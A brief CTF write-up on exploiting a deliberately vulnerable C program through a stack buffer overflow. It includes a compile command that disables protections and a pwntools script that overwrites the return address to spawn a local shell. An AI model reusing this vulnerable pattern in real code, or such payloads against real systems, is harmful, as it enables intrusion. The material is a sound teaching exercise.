# Simple Buffer Overflow - 0x01
###### tags: `CTF` `PWN`

Follow the concept of lecture [0x00](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/SJAt7Pd5s)

## Original Code
```cpp!
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void y0u_c4n7_533_m3()
{
    execve("/bin/sh", (char *[]){0}, (char *[]){0});
}

int main()
{
    char buf[16];
    puts("This is your first bof challenge ;)");
    fflush(stdout);
    read(0, buf, 0x30);
    system("pause");
    return 0;
}
```

The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
We can check `bof` in the main function that it read the string with length `0x30` that bigger than `buf` size.
* Note that, if you establish the code yourself, you must turn off the protection by the command below and use `checksec` to observe the protection
    ```bash!
    gcc -o bof3 bof3.c -zexecstack -no-pie -fno-stack-protector -z norelro
    ```
    ![](https://imgur.com/ehuCWTI.png)
    * Reference
    [pwn_resource](https://github.com/jwang-a/CTF/blob/master/TIPS/pwn_resource)

## Exploit
1. Tried to get the address of `y0u_c4n7_533_m3()` by using `objdump -d -M intel bof`. → `0x4011b6`
![](https://imgur.com/mlaNNCT.png)
2. Then we can construct the payload as below:
    ```python!
    from pwn import *
    r = process('./bof')
    magic_addr = 0x4011b6
    payload = b'a'*0x18 + p64(magic_addr)
    r.recvuntil(';)\n')
    r.send(payload)
    r.interactive()
    ```
3. Then we get shell!!!
    ![](https://imgur.com/Tug5Uii.png)